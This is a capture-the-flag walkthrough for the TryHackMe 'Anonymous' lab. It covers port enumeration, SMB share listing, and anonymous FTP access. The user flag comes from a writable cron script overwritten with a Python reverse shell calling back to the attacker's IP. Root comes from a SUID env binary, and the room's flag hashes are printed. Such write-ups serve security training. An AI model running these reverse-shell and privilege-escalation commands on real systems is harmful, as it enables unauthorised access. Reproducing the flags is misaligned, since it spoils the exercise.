---
description: 'https://tryhackme.com/room/anonymous'
---

# Anonymous

## Task 1 Pwn

### Enumerate the machine.  How many ports are open?

```text
nmap -sC -sV -T5 -p1-65535 10.10.17.122
```

![](../.gitbook/assets/image%20%28254%29.png)

{% hint style="success" %}
4
{% endhint %}

### What service is running on port 21?

![](../.gitbook/assets/image%20%28253%29.png)

{% hint style="success" %}
ftp
{% endhint %}

### What service is running on ports 139 and 445?

![](../.gitbook/assets/image%20%28252%29.png)

{% hint style="success" %}
smb
{% endhint %}

### There's a share on the user's computer.  What's it called?

```text
enum4linux -S 10.10.17.122
```

![](../.gitbook/assets/image%20%28251%29.png)

{% hint style="success" %}

{% endhint %}

### user.txt 

![](../.gitbook/assets/image%20%28278%29.png)

![](../.gitbook/assets/image%20%28284%29.png)

![](../.gitbook/assets/image%20%28250%29.png)

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

```text
nc -nvlp 4444

mget *
ls -all
vi clean.sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.4.204",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

ftp 10.10.178.0
anonymous
password
cd scripts
mput clean.sh
y
```

![](../.gitbook/assets/image%20%28262%29.png)

![](../.gitbook/assets/image%20%28275%29.png)

{% hint style="success" %}
90d6f992585815ff991e68748c414740
{% endhint %}

### root.txt

```text
find / -perm -u=s -type f 2>/dev/null
```

{% embed url="https://gtfobins.github.io/gtfobins/env/" %}

```text

env /bin/sh -p
cat /root/root.txt
```

![](../.gitbook/assets/image%20%28260%29.png)

{% hint style="success" %}
4d930091c31a622a7ed10f27999af363
{% endhint %}

